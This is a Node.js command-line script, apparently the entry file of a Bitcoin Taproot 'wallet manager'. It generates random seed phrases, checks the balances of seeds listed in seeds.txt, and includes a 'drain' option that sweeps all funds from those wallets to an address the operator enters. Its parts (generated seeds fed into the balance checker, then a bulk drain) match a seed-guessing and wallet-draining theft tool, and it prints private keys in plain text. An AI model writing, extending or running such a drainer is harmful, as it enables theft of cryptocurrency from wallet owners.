const TaprootWalletGenerator = require('./wallet-generator');
const BalanceChecker = require('./balance-checker');
const WalletDrainer = require('./wallet-drainer');

class TaprootManager {
    constructor() {
        this.generator = new TaprootWalletGenerator();
        this.balanceChecker = new BalanceChecker();
        this.walletDrainer = new WalletDrainer();
    }

    // Отображение меню
    displayMenu() {
        console.log('\n' + '='.repeat(60));
        console.log('🚀 TAPROOT WALLET MANAGER 🚀');
        console.log('='.repeat(60));
        console.log('1. 🏦 Проверить балансы из seeds.txt');
        console.log('2. 🔐 Генерировать seed фразы');
        console.log('3. 💸 Опустошить кошельки (перевести средства)');
        console.log('4. ❌ Выход');
        console.log('='.repeat(60));
    }

    // Основное меню
    async runInteractiveMode() {
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        const askQuestion = (question) => {
            return new Promise((resolve) => {
                rl.question(question, resolve);
            });
        };

        let running = true;
        
        while (running) {
            this.displayMenu();
            const choice = await askQuestion('Выберите опцию (1-4): ');

            switch (choice.trim()) {
                case '1':
                    console.log('\nЗапуск проверки балансов...');
                    await this.balanceChecker.checkAllBalances(10); // Фиксированное количество адресов
                    break;

                case '2':
                    console.log('\nГенерация seed фраз...');
                    const wordCount = await askQuestion('Генерировать seed фразы из 12 или 24 слов? (по умолчанию 12): ');
                    const words = parseInt(wordCount) === 24 ? 24 : 12;
                    const seedCount = await askQuestion('Сколько seed фраз сгенерировать? (по умолчанию 5): ');
                    const sCount = parseInt(seedCount) || 5;
                    this.generateSeeds(sCount, words);
                    break;

                case '3':
                    console.log('\nОпустошение кошельков...');
                    await this.drainWallets();
                    break;

                case '4':
                    console.log('👋 До свидания!');
                    running = false;
                    break;

                default:
                    console.log('❌ Неверный выбор. Попробуйте снова.');
                    break;
            }

            if (running) {
                await askQuestion('\nНажмите Enter для продолжения...');
            }
        }

        rl.close();
    }

    // Опустошение кошельков
    async drainWallets() {
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        const askQuestion = (question) => {
            return new Promise((resolve) => {
                rl.question(question, resolve);
            });
        };

        try {
            console.log('\n🎯 НАСТРОЙКА ОПУСТОШЕНИЯ КОШЕЛЬКОВ');
            console.log('⚠️  ВНИМАНИЕ: Эта операция переведет ВСЕ средства с кошельков из seeds.txt на указанный адрес!');
            
            const confirm = await askQuestion('\nВы уверены, что хотите продолжить? (да/нет): ');
            if (confirm.toLowerCase() !== 'да' && confirm.toLowerCase() !== 'yes') {
                console.log('❌ Операция отменена');
                rl.close();
                return;
            }

            const targetAddress = await askQuestion('\n🎯 Введите Taproot адрес получателя (bc1p...): ');
            
            // Простая валидация Taproot адреса
            if (!targetAddress.startsWith('bc1p') || targetAddress.length < 60) {
                console.log('❌ Неверный формат Taproot адреса');
                rl.close();
                return;
            }

            // Выбор комиссии
            const feeRate = await this.walletDrainer.selectFeeRate();
            
            rl.close();

            console.log(`\n🚀 Начинаем опустошение кошельков...`);
            console.log(`🎯 Адрес получателя: ${targetAddress}`);
            console.log(`⚡ Комиссия: ${feeRate} sat/byte`);
            
            await this.walletDrainer.drainWallets(targetAddress, feeRate);
            
        } catch (error) {
            console.log(`❌ Ошибка: ${error.message}`);
            rl.close();
        }
    }

    // Генерация кошельков
    generateWallets(count = 3) {
        console.log(`\nГенерация ${count} Taproot кошельков:\n`);
        
        for (let i = 0; i < count; i++) {
            const seed = this.generator.generateSeedPhrase();
            const wallet = this.generator.generateTaprootAddress(seed);
            
            console.log(`🔑 Кошелек ${i + 1}:`);
            console.log(`   Seed: ${seed}`);
            console.log(`   Адрес: ${wallet.address}`);
            console.log(`   Приватный ключ: ${wallet.privateKey}`);
            console.log('');
        }
    }

    // Генерация seed фраз
    generateSeeds(count = 5, wordCount = 12) {
        console.log(`\nГенерация ${count} seed фраз (${wordCount} слов):\n`);
        
        const seeds = this.generator.generateMultipleSeeds(count, wordCount);
        seeds.forEach((seed, index) => {
            const walletInfo = this.generator.generateTaprootAddress(seed);
            console.log(`${index + 1}. Seed: ${seed}`);
            console.log(`   Адрес: ${walletInfo.address}`);
            console.log(`   Приватный ключ: ${walletInfo.privateKey}`);
            
            // Сохраняем в файл generated.txt
            this.generator.saveWalletToFile(seed, walletInfo.privateKey, walletInfo.address);
            console.log('');
        });
        
        console.log(`💾 Результаты сохранены в файл generated.txt`);
        console.log(`💡 Эти seed фразы можно добавить в файл seeds.txt для проверки балансов`);
    }
}

// Основная функция
async function main() {
    const args = process.argv.slice(2);
    const manager = new TaprootManager();

    if (args.length === 0) {
        // Интерактивный режим
        await manager.runInteractiveMode();
    } else {
        // Режим командной строки
        const command = args[0].toLowerCase();
        
        switch (command) {
            case 'balance':
            case 'check':
                await manager.balanceChecker.checkAllBalances(10); // Фиксированное количество
                break;
                
            case 'seeds':
                const args2 = args.slice(1);
                const seedCount = args2[0] ? parseInt(args2[0]) : 5;
                const wordCount = args2[1] ? parseInt(args2[1]) : 12;
                const validWordCount = (wordCount === 24) ? 24 : 12;
                manager.generateSeeds(seedCount, validWordCount);
                break;
                
            case 'drain':
                console.log('❌ Опустошение кошельков доступно только в интерактивном режиме для безопасности');
                console.log('💡 Запустите: node index.js');
                break;
                
            default:
                console.log('Использование:');
                console.log('  node index.js                     - Интерактивный режим');
                console.log('  node index.js balance             - Проверить балансы');
                console.log('  node index.js seeds [число] [12|24] - Генерировать seed фразы');
                console.log('  node index.js drain               - Опустошить кошельки (только интерактивно)');
                break;
                console.log('    Примеры:');
                console.log('      node index.js seeds 5 12      - 5 фраз по 12 слов');
                console.log('      node index.js seeds 3 24      - 3 фразы по 24 слова');
                break;
        }
    }
}

// Запуск программы
if (require.main === module) {
    main().catch(console.error);
}
